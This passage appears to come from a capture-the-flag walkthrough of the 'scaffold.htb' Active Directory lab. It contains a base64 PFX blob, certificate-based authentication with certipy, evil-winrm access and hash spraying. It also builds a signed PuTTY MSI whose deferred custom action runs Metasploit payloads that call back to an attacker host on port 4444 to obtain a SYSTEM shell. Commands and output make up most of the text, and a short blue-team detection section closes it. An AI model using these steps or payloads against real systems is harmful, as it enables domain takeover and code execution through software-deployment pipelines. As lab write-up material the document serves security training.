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
```

We recover the PFX password with `pfx2john` / `john` (`[REDACTED]` on this instance), then map the cert to `d.cooper`:

```bash
> cd ~/scaffold-mdt
> base64 -d <<< 'PASTE_B64' > InternalCodeSigning_01.pfx
> openssl pkcs12 -in InternalCodeSigning_01.pfx -nodes -passin pass:[REDACTED] | head
> certipy auth -pfx InternalCodeSigning_01.pfx -username d.cooper@scaffold.htb -password [REDACTED] -dc-ip 10.129.68.148
```

`MITRE ID : Steal or Forge Authentication Certificates T1649`
`MITRE ID : Valid Accounts T1078`
`MITRE ID : Remote Services - Windows Remote Management T1021.006`

We decode it and login as `d.cooperw` via `WinRM` :

```powershell
> �evil-winrm -i 10.129.68.148 -u d.cooper -H '[REDACTED]'  
  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/fragment.rb:35: warning: redefining 'object_id' may cause serious problems  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/winrm-2.3.9/lib/winrm/psrp/message_fragmenter.rb:29: warning: redefining 'object_id' may cause serious problems  
/usr/lib/ruby/3.4.0/readline.rb:4: warning: reline was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 4.0.0.  
You can add reline to your Gemfile or gemspec to silence this warning.  
����������������������������������������  
Evil-WinRM shell v3.9  
����������������������������������������  
Warning: Remote path completions is disabled due to ruby limitation: undefined method 'quoting_detection_proc' for module Reline  
����������������������������������������  
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion  
����������������������������������������  
Info: Establishing connection to remote endpoint  
/usr/share/evil-winrm/vendor/bundle/ruby/3.4.0/gems/rexml-3.4.4/lib/rexml/xpath.rb:67: warning: REXML::XPath.each, REXML::XPath.first, REXML::XPath.match dropped support for nodeset...  
*Evil-WinRM* PS C:\Users\d.cooper\Documents> type C:\Software\Repository\PuTTY\deploy.json  
dir C:\Software\Repository\PuTTY  
type C:\Software\Scripts\Deploy-Engine.ps1 | Select-Object -First 80  
dir C:\Software\Logs\Validator -ErrorAction SilentlyContinue | sort LastWriteTime -Descending | select -First 3  
Get-Content (dir C:\Software\Logs\Validator\*.log | sort LastWriteTime -Descending | select -First 1).FullName -Tail 30  
{  
�"AppName": "PuTTY",  
�"TrustedSubject": "CN=Package_Developers",  
�"TrustedIssuerKeyword": "scaffold-DC-CA",  
�"ProductCode": "{ED41CD4E-33BB-400C-AB20-B09388DC83EF}",  
�"InstallDir": "C:\\Program Files\\PuTTY",  
�"VerifyFile": "plink.exe",  
�"VerifyCommand": "-V",  
�"DisplayNameMatch": "PuTTY"  
}  
  
  
���Directory: C:\Software\Repository\PuTTY  
  
  
Mode ����������������LastWriteTime ��������Length Name  
---- ����������������------------- ��������------ ----  
d----- ��������5/18/2026 ��2:30 PM ���������������History  
-a---- ��������5/21/2026 ��4:30 PM �����������302 deploy.json  
#Requires -Version 5.1  
#Requires -RunAsAdministrator  
  
<#  
.SYNOPSIS  
���Enterprise MSI deployment engine.  
  
.DESCRIPTION  
���SYSTEM-run deployment worker for approved MSI packages in Packages\Ready.  
���Developers/operators pre-validate packages with Scripts\Validator.ps1 before  
���release. Only approved MSIs are copied into Ready. The engine validates  
���repository metadata again, installs only newer versions, writes audit logs,  
���and moves packages through Ready -> Archive / Rejected.  
  
.NOTES  
���Repository stores application metadata, hash allowlists, and History.  
���Intended for Scheduled Task execution as SYSTEM.  
#>  
  
[CmdletBinding(SupportsShouldProcess)]  
param(  
���[string]$BaseDir = "C:\Software"  
)  
  
Set-StrictMode -Version Latest  
$ErrorActionPreference = "Stop"  
  
$script:SupportedApps = @("PuTTY", "7-Zip")  
$script:PackagesDir = Join-Path $BaseDir "Packages"  
$script:ReadyDir = Join-Path $script:PackagesDir "Ready"  
$script:ArchiveDir = Join-Path $script:PackagesDir "Archive"  
$script:RejectedDir = Join-Path $script:PackagesDir "Rejected"  
$script:RepositoryDir = Join-Path $BaseDir "Repository"  
$script:EngineLogDir = Join-Path $BaseDir "Logs\Engine"  
$script:WatcherLogDir = Join-Path $BaseDir "Logs\Watcher"  
$script:ValidatorLogDir = Join-Path $BaseDir "Logs\Validator"  
$script:LocksDir = Join-Path $BaseDir "Locks"  
$script:ConfigDir = Join-Path $BaseDir "Config"  
$script:ReportsDir = Join-Path $BaseDir "Reports"  
$script:ScriptsDir = Join-Path $BaseDir "Scripts"  
$script:LockPath = Join-Path $script:LocksDir "Deploy-Engine.lock"  
$script:ProcessingDir = Join-Path $script:LocksDir "Processing"  
$script:LogFile = $null  
$script:TranscriptStarted = $false  
$script:LockAcquired = $false  
$script:EngineCmdlet = $PSCmdlet  
  
$script:ForbiddenPathPrefixes = @(  
���"$env:TEMP",  
���"$env:TMP",  
���"$env:APPDATA",  
���"$env:LOCALAPPDATA",  
���"C:\Users"  
)  
  
function Initialize-RestrictedDirectory {  
���param([string]$Path)  
  
���if (-not (Test-Path -LiteralPath $Path)) {  
�������New-Item -ItemType Directory -Path $Path -Force | Out-Null  
���}  
  
���# Engine state is restricted because it runs as SYSTEM and writes audit data.  
���$acl = Get-Acl -LiteralPath $Path  
���$acl.SetAccessRuleProtection($true, $false)  
���$adminRule = New-Object System.Security.AccessControl.FileSystemAccessRule(  
�������"BUILTIN\Administrators", "FullControl", "ContainerInherit,ObjectInherit",  
�������"None", "Allow"  
���)  
���$systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule(  
�������"NT AUTHORITY\SYSTEM", "FullControl", "ContainerInherit,ObjectInherit",  
�������"None", "Allow"  
���)  
���$acl.SetAccessRule($adminRule)  
���$acl.SetAccessRule($systemRule)  
���Set-Acl -LiteralPath $Path -AclObject $acl  
}  
  
function Initialize-Directory {  
���param([string]$Path)  
  
  
���Directory: C:\Software\Logs\Validator  
  
  
Mode ����������������LastWriteTime ��������Length Name  
---- ����������������------------- ��������------ ----  
-a---- ���������6/1/2026 �11:48 AM �����������827 ScaffoldPortal_20260601.log  
-a---- ���������6/1/2026 �11:48 AM �����������459 stdout_20260601184659_8148.log  
-a---- ��������5/26/2026 ��7:28 AM ����������5305 ScaffoldPortal_20260526.log  
[2026-06-01 11:47:22.461] [INFORMA] [] [PORTAL] Scaffold MSI Deployment Portal starting.  
[2026-06-01 11:47:22.799] [WARNING] [Microsoft.AspNetCore.StaticFiles.StaticFileMiddleware] The WebRootPath was not found: C:\inetpub\ScaffoldPortal\wwwroot. Static files may be unavailable.  
[2026-06-01 11:47:22.809] [INFORMA] [Microsoft.Hosting.Lifetime] Application started. Press Ctrl+C to shut down.  
[2026-06-01 11:47:22.809] [INFORMA] [Microsoft.Hosting.Lifetime] Hosting environment: Production  
[2026-06-01 11:47:22.809] [INFORMA] [Microsoft.Hosting.Lifetime] Content root path: C:\inetpub\ScaffoldPortal  
[2026-06-01 11:47:23.887] [INFORMA] [Serilog.AspNetCore.RequestLoggingMiddleware] HTTP GET / responded 200 in 1055.7800 ms  
[2026-06-01 11:48:56.781] [INFORMA] [Microsoft.Hosting.Lifetime] Application is shutting down...
```

The MSI pipeline on this host is `Portal upload` then `m.chen` approval then `Packages\Ready` then `Watcher.ps1` then `Validator.ps1` then `Deploy-Engine.ps1` as `SYSTEM`. `deploy.json` locks `ProductCode`, `DisplayNameMatch`, and the trusted signing subject; PuTTY has no `hashes.json`, so we only need a valid Authenticode signature from `CN=Package_Developers` and a `ProductVersion` strictly higher than what is already installed.

`d.cooper` has `CREATE_CHILD` on `OU=Dev_Machines`. We enroll a throwaway machine into that OU and request the `PackagingCodeSigning` template (`CN=Package_Developers`), not the `InternalCodeSigning_01` cert used for developer login:

```bash
> /usr/bin/bloodyad --host dc.scaffold.htb -d scaffold.htb \
  -u d.cooper -p '[REDACTED]' -f rc4 --dc-ip 10.129.68.148 \
  add computer --ou 'OU=Dev_Machines,OU=Packaging_Team,OU=Scaffold,DC=scaffold,DC=htb' 'SCAFFOLDPC' '[REDACTED]'

> certipy req -u 'SCAFFOLDPC$@scaffold.htb' -p '[REDACTED]' \
  -target dc.scaffold.htb -ca scaffold-DC-CA -template PackagingCodeSigning \
  -subject 'CN=Package_Developers' -dc-ip 10.129.68.148
```

```bash
Certipy v5.1.0 - by Oliver Lyak (ly4k)  
  
[*] Requesting certificate via RPC  
[*] Request ID is 44  
[*] Successfully requested certificate  
[*] Got certificate with subject: CN=Package_Developers  
[*] Got certificate without identity  
[*] Certificate has no object SID  
[*] Try using -sid to set the object SID or see the wiki for more details  
[*] Saving certificate and private key to 'scaffoldpc.pfx'  
File 'scaffoldpc.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): scaffoldpc2.pfx  
[*] Wrote certificate and private key to 'scaffoldpc_a2bbd628-71a5-4b64-a945-6767d3535532.pfx'
```

```bash
> export LHOST=10.10.15.133 LPORT=4444 PFX=./scaffoldpc.pfx PFX_PASS='' && ./build-putty-msi.sh 2>&1`

[*] Generating SYSTEM callback payload
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
[*] Generating post-install plink.exe stub
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 285 bytes
Final size of exe file: 7168 bytes
Saved as: plink.exe
[*] Building base MSI
[*] Embedding payload + deferred CustomAction
]633;C[*] Generating SYSTEM callback payload
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: payload.exe
[*] Generating post-install plink.exe stub
Warning: KRB5CCNAME environment variable not supported - unsetting
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 285 bytes
Final size of exe file: 7168 bytes
Saved as: plink.exe
[*] Building base MSI
[*] Embedding payload + deferred CustomAction
```

The WiX build signs with `scaffoldpc.pfx` (`TrustedSubject` = `CN=Package_Developers`). `wixl` cannot emit a deferred `CustomAction` cleanly on Arch, so we repair `CustomAction.idt` with `msibuild` and keep `SystemPayload` in `InstallExecuteSequence` after `InstallFiles` � otherwise the MSI validates but never runs our payload.

`MITRE ID : Software Deployment Tools T1072`

We spray `d.cooper`'s hash :

```bash
> �nxc smb 10.129.68.148 -u spray-users.txt \  
�-H '[REDACTED]' \  
�-d scaffold.htb --continue-on-success  
SMB ��������10.129.68.148 ��445 ���DC ��������������[*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:scaffold.htb) (signing:True) (SMBv1:False) (Null Auth:True)  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\t.walker:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\o.bennett:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\svc_mdt:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\m.carter:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\t.nguyen:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[+] scaffold.htb\d.cooper:[REDACTED] �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\r.wilson:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\k.patel:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\svc_mdtmonitor:[REDACTED] STATUS_LOGON_FAILURE �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[+] scaffold.htb\m.chen:[REDACTED] �  
SMB ��������10.129.68.148 ��445 ���DC ��������������[-] scaffold.htb\j.harris:[REDACTED] STATUS_LOGON_FAILURE
```

`[+] scaffold.htb\m.chen:[REDACTED]`

`m.chen` shares the same NT hash as `d.cooper` � packaging manager approves what the developer uploads. We upload as `d.cooper` with Kerberos (`curl --negotiate`) or Firefox, then approve as `m.chen`:

```bash
> export KRB5CCNAME=$(realpath d.cooper.ccache)
> curl -sk --negotiate -u : -c /tmp/dc.cookies https://dc.scaffold.htb/Package/Upload -o /tmp/up.html
> TOKEN=$(rg -o 'name="__RequestVerificationToken"[^>]+value="[^"]+"' /tmp/up.html | sed 's/.*value="//;s/"$//')
> curl -sk --negotiate -u : -b /tmp/dc.cookies \
  -F "__RequestVerificationToken=$TOKEN" \
  -F "file=@putty-update-signed.msi" \
  https://dc.scaffold.htb/Package/Upload -D /tmp/up.hdr
```

On `https://dc.scaffold.htb` :
 `Package 'putty-update-signed.msi' uploaded successfully. SHA256: [REDACTED]...`

Then :

```bash
cat > /tmp/firefox-mchen/user.js <<'EOF'  
user_pref("network.negotiate-auth.trusted-uris", "https://dc.scaffold.htb");  
user_pref("network.negotiate-auth.delegation-uris", "https://dc.scaffold.htb");  
user_pref("network.negotiate-auth.using-native-gsslib", true);  
user_pref("network.automatic-ntlm-auth.trusted-uris", "https://dc.scaffold.htb");  
EOF  
  
firefox --no-remote --profile /tmp/firefox-mchen 'https://dc.scaffold.htb/'
```

```
Package approved and moved to Ready queue.
```

We can approve from the CLI with Kerberos once clock is aligned � same split as the portal UI (`d.cooper` upload, `m.chen` approve):

```bash
> sudo ntpdate -u 10.129.68.148
> getTGT.py 'scaffold.htb/m.chen' -hashes '[REDACTED]' -dc-ip 10.129.68.148
> export KRB5CCNAME=$(realpath m.chen.ccache)
> curl -sk --negotiate -u : -c /tmp/mc.cookies https://dc.scaffold.htb/Validation/Review/29 -o /tmp/review.html
> TOKEN=$(rg -o 'name="__RequestVerificationToken"[^>]+value="[^"]+"' /tmp/review.html | head -1 | sed 's/.*value="//;s/"$//')
> curl -sk --negotiate -u : -b /tmp/mc.cookies -X POST \
  --data-urlencode "__RequestVerificationToken=$TOKEN" \
  --data-urlencode "notes=Approved PuTTY update." \
  https://dc.scaffold.htb/Validation/Approve/29
```

We run `catch-shell.py` on `4444` before approval. `Deploy-Engine.ps1` installs as `SYSTEM` and our deferred `CustomAction` calls back; we read the flag with forward slashes to avoid the `\\r` escape in `C:\\Users\\Administrator\\Desktop\\root.txt`:

```bash
> python3 ~/scaffold-mdt/catch-shell.py
```

`MITRE ID : System Services - Service Execution T1569.002`
`MITRE ID : Ingress Tool Transfer T1105`

We reset the ntpdate to skew the clock to the DC and use `certipy` :

```bash
> sudo ntpdate -u 10.129.68.148 2>&1; date
```

```bash
which certipy certipy-ad getTGT.py 2>/dev/null; ls /home/vagabond/scaffold-mdt/*.ccache cd /home/vagabond/scaffold-mdt getTGT.py 'scaffold.htb/d.cooper' -hashes '[REDACTED]' -dc-ip 10.129.68.148 2>&1 getTGT.py 'scaffold.htb/m.chen' -hashes '[REDACTED]' -dc-ip 10.129.68.148 2>&1 export KRB5CCNAME="$(realpath d.cooper.ccache)" klist 2>&1 | head -6 kvno HTTP/dc.scaffold.htb 2>&1
```

```bash
cd /home/vagabond/scaffold-mdt /home/vagabond/.local/bin/certipy auth -u 'd.cooper@scaffold.htb' -hashes '[REDACTED]' -dc-ip 10.129.68.148 2>&1 /home/vagabond/.local/bin/certipy auth -u 'm.chen@scaffold.htb' -hashes '[REDACTED]' -dc-ip 10.129.68.148 2>&1 export KRB5CCNAME="$(realpath d.cooper.ccache)" kvno HTTP/dc.scaffold.htb 2>&1 curl -sk --negotiate -u : -o /dev/null -w 'd.cooper portal HTTP:%{http_code}\n' https://dc.scaffold.htb/ export KRB5CCNAME="$(realpath m.chen.ccache)" kvno HTTP/dc.scaffold.htb 2>&1 curl -sk --negotiate -u : -o /dev/null -w 'm.chen portal HTTP:%{http_code}\n' https://dc.scaffold.htb/
```

```bash
> �cat /home/vagabond/scaffold-mdt/root.txt  
[REDACTED]
```

And we got the root flag : `[REDACTED]`

**Blue Team :**
Hunt unauthenticated `MDTMonitor` traffic on `9800`/`9801`, outbound HTTP from the DC to attacker IPs during `GetSettings`, and password-spray bursts against many principals from one source. After foothold, watch `userAccountControl` clears on quarantined users, `groupType` edits on security groups, and new machine accounts in packaging OUs followed by `PackagingCodeSigning` enrollments. The MSI portal should alert on rapid version bumps, approvals by packaging managers, and `msiexec` child processes spawned from `Deploy-Engine.ps1` rather than an interactive user.

**Purple Team :**
The operator stayed on the intended chain: XXE against a deployment monitor nobody remembers exposing, password reuse from a cleartext `CustomSettings.ini`, helpdesk `AddSelf` instead of noisy Kerberos attacks, and signed MSI abuse where `Validator.ps1` only checks metadata and Authenticode while `Deploy-Engine.ps1` runs deferred actions as `SYSTEM`. Clock skew on our attack host blocked Kerberos portal auth until `ntpdate` aligned to the DC; approving from the DC with local `curl --negotiate` would have sidestepped that entirely.